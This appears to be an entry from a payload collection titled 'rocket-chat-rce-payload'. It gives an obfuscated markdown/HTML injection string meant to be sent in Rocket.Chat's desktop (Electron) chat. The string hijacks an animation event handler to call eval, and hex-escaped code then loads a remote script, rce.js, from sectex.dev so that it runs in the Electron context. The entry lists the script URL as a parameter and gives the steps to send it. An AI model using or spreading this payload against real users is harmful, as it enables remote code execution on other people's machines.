---
data: >-
  https://a?p=[ ](https://a.de?
  style=animation-duration:1s;animation-name:blink;animation-iteration-count:2
  onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2frce.js\x27;document.body.appendChild\x28s\x29;'instanceof[]
  target=_blank data-x=`.")
tags:
  - rce
  - desktop
type: command
output: null
executor: javascript
platforms:
  - Desktop (Electron)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.231Z'
id: 43f93b82-7df1-4f70-91c2-91cdfab137f2
verified: false
validated: true
submitted: true
---
# rocket-chat-rce-payload

## Command

```javascript
https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2frce.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.")
```

## Description

Payload for RCE in Desktop client via loaded script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| https://sectex.dev/files/rce.js | RCE script URL | Yes |

## Examples

Send in Desktop chat.

## Expected Output

RCE script executes in Electron context.

## Related

- [[commands/rocket-chat-load-external-script]]
